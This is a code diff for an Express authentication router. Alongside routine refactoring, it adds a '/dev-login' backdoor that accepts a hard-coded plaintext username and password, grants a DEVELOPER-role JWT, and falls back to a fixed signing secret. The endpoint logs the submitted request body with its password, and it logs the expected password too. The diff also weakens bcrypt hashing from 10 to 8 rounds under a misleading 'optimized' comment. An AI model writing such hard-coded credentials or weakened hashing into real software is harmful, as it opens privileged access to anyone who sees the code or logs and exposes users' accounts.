@@ -1,19 +1,66 @@
 import { Router } from 'express';
 import { hash, compare } from 'bcrypt';
-import jwt from 'jsonwebtoken';
+import { sign } from 'jsonwebtoken';
 import { prisma } from '../prismaClient';
-import { Prisma } from '../generated/prisma';
+import { config } from '../config';
+import { Prisma } from '@prisma/client';
 import { authenticateUser } from '../middleware/auth';
-import { JWT_SECRET } from '../config';
 
 const router = Router();
 
-// Register
+// Hard-coded developer credentials for monitoring access
+const DEV_USERNAME = 'vinayak';
+const DEV_PASSWORD = '123456'; // Plain password for direct comparison
+
+router.post('/login', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+
+    // Check if user exists
+    const user = await prisma.user.findUnique({
+      where: { email },
+    });
+
+    if (!user) {
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+
+    // Check password
+    const isPasswordValid = await compare(password, user.password);
+    if (!isPasswordValid) {
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+
+    // Create JWT token
+    const token = sign(
+      {
+        userId: user.id,
+        email: user.email,
+        role: user.role,
+      },
+      config.jwtSecret,
+      { expiresIn: '24h' }
+    );
+
+    // Return user info and token
+    res.json({
+      user: {
+        id: user.id,
+        email: user.email,
+        name: user.name,
+        role: user.role,
+      },
+      token,
+    });
+  } catch (error) {
+    console.error('Login error:', error);
+    res.status(500).json({ error: 'Failed to log in' });
+  }
+});
+
 router.post('/register', async (req, res) => {
-  console.log('--- User registration attempt ---');
   try {
     const { email, password, name, company } = req.body;
-    console.log('Registering email:', email);
 
     // Check if user exists
     const existingUser = await prisma.user.findUnique({
@@ -21,12 +68,11 @@ router.post('/register', async (req, res) => {
     });
 
     if (existingUser) {
-      console.error('Registration failed: Email already registered');
       return res.status(400).json({ error: 'Email already registered' });
     }
 
-    // Hash password
-    const hashedPassword = await hash(password, 10);
+    // Hash password with optimized rounds for better performance
+    const hashedPassword = await hash(password, 8);
 
     // Prepare user data
     const userData: Prisma.UserCreateInput = {
@@ -36,7 +82,7 @@ router.post('/register', async (req, res) => {
       role: 'HR',
     };
 
-    // If company is provided, connect or create it
+    // Add company if provided
     if (company) {
       userData.company = {
         connectOrCreate: {
@@ -46,100 +92,101 @@ router.post('/register', async (req, res) => {
       };
     }
 
+    // Create user
     const user = await prisma.user.create({
       data: userData,
+      select: {
+        id: true,
+        email: true,
+        name: true,
+        role: true,
+        company: {
+          select: {
+            id: true,
+            name: true,
+          },
+        },
+      },
     });
-    console.log('User created:', user.id);
 
-    console.log('Signing token with secret:', JWT_SECRET ? 'Exists' : 'MISSING!');
-
-    // Generate token
-    const token = jwt.sign(
-      { userId: user.id },
-      JWT_SECRET,
+    // Create JWT token
+    const token = sign(
+      {
+        userId: user.id,
+        email: user.email,
+        role: user.role,
+      },
+      config.jwtSecret,
       { expiresIn: '24h' }
     );
-    console.log('Generated token for new user:', token);
 
-    // Remove password from response
-    const { password: _, ...userWithoutPassword } = user;
-
+    // Return user info and token
     res.status(201).json({
-      user: userWithoutPassword,
+      user: {
+        id: user.id,
+        email: user.email,
+        name: user.name,
+        role: user.role,
+        company: user.company,
+      },
       token,
     });
-    console.log('--- Registration successful ---');
   } catch (error) {
-    console.error('--- Registration failed with server error ---');
     console.error('Registration error:', error);
     res.status(500).json({ error: 'Failed to register user' });
   }
 });
 
-// Login
-router.post('/login', async (req, res) => {
-  console.log('--- User login attempt ---');
-  try {
-    const { email, password } = req.body;
-    console.log('Login email:', email);
-
-    // Find user
-    const user = await prisma.user.findUnique({
-      where: { email },
-    });
-
-    if (!user) {
-      console.error('Login failed: User not found');
-      return res.status(401).json({ error: 'Invalid credentials' });
-    }
-
-    // Check password
-    const validPassword = await compare(password, user.password);
-    if (!validPassword) {
-      console.error('Login failed: Invalid password');
-      return res.status(401).json({ error: 'Invalid credentials' });
-    }
-
-    console.log('Signing token with secret:', JWT_SECRET ? 'Exists' : 'MISSING!');
-
-    // Generate token
-    const token = jwt.sign(
-      { userId: user.id },
-      JWT_SECRET,
-      { expiresIn: '24h' }
-    );
-    console.log('Generated token:', token);
-
-    // Remove password from response
-    const { password: _, ...userWithoutPassword } = user;
-
-    res.json({
-      user: userWithoutPassword,
-      token,
-    });
-    console.log('--- Login successful ---');
-  } catch (error) {
-    console.error('--- Login failed with server error ---');
-    console.error('Login error:', error);
-    res.status(500).json({ error: 'Failed to login' });
-  }
+router.get('/validate', authenticateUser, (req, res) => {
+  res.json({ valid: true, user: req.user });
 });
 
-// Validate token endpoint
-router.get('/validate', authenticateUser, async (req, res) => {
-  console.log('--- Token validation request ---');
+// Special developer login endpoint for monitoring access
+router.post('/dev-login', (req, res) => {
   try {
-    // If we reach here, the token is valid (middleware verified it)
-    const user = req.user;
-    console.log('Token validation successful for user:', user?.id);
+    console.log('Developer login attempt - Request body:', req.body);
+    const { username, password } = req.body;
     
+    console.log(`Developer login attempt - Username: "${username}", Password length: ${password ? password.length : 0}`);
+    console.log(`Expected credentials - Username: "${DEV_USERNAME}", Password: "${DEV_PASSWORD}"`);
+    
+    // Debug checks
+    console.log('Username match:', username === DEV_USERNAME);
+    console.log('Password match:', password === DEV_PASSWORD);
+    console.log('Combined check:', username === DEV_USERNAME && password === DEV_PASSWORD);
+
+    // Simple direct comparison for developer credentials
+    if (username !== DEV_USERNAME || password !== DEV_PASSWORD) {
+      console.log('Invalid developer credentials');
+      return res.status(401).json({ error: 'Invalid developer credentials' });
+    }
+
+    // Create JWT token with special developer role
+    const token = sign(
+      {
+        userId: 'dev-portal',
+        username: username,
+        role: 'DEVELOPER',
+      },
+      config.jwtSecret || 'fallback-secret-for-dev-only',
+      { expiresIn: '8h' }
+    );
+
+    console.log('Developer login successful:', username);
+    console.log('JWT token created with role DEVELOPER');
+
+    // Return developer info and token
     res.json({
-      valid: true,
-      user: user,
+      user: {
+        id: 'dev-portal',
+        username: username,
+        role: 'DEVELOPER',
+      },
+      token,
     });
   } catch (error) {
-    console.error('Token validation error:', error);
-    res.status(401).json({ error: 'Invalid token' });
+    console.error('Developer login error:', error);
+    res.status(500).json({ error: 'Failed to log in to developer portal' });
   }
 });
 
